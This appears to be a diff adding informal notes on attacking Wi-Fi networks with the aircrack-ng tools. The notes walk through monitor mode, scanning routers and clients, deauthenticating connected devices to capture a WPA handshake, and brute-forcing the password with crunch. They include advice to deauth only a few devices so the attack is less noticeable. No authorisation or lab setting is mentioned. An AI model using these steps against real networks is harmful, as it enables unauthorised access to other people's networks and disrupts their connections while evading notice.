@@ -1,0 +1,46 @@
+# First, change wifi card to monitor (wlp6s0 can be replaced with interface name)
+ifconfig wlp6s0 (interface) down
+iwconfig wlp6s0 mode monitor
+ifconfig wlp6s0 up
+
+# Then, setup to work with aircrack
+airmon-ng check wlp6s0 (interface)
+
+# Get rid of any service interfering, for avahi-daemon might need to use systemctl stop avahi-daemon.service
+
+kill PID etc
+
+kill netmanage first usually
+
+# Then, use airodump to scan interface for all connections seen
+
+airodump-ng wlp6s0
+
+# Top box will show any AP within your device that you could connect to, then lower one shows individual devices that may be possible connected to one of the AP's listed above
+
+# After scan, use airodump again for more specific scan
+
+airodump-ng -c 1-11 -w file --bssid address here interface
+
+c=channel you want to scan to find specific routers using such channel
+w=can write to a file
+--bssid=the bssid of router
+then put in the interface once again
+
+# After scan, use aireplay-ng to deauth devices, a good idea would be to only deauth a couple of devices instead of everything connected to the router and make it less noticeable
+
+ex. aireplay-ng -0 # -a BSSID
+
+-0= enter in a number to specifiy how many times or seconds to run the deathuentication. Using 0 for the number will run this infinitely until stopped
+-a= the address or BSSID of router
+use interface at end again
+
+# Use program running until your see the handshake has been created while using the airodump scan in separate tab. Can stop deauth, then the capture of airodump will display WPA handshake soon enough
+
+# Then look at file
+
+So,
+airmon - use to check initial stuff
+airodump - use to scan
+aireplay - use to deauth/attack
+aircrack - use with crunch to brute passwrd with capture file
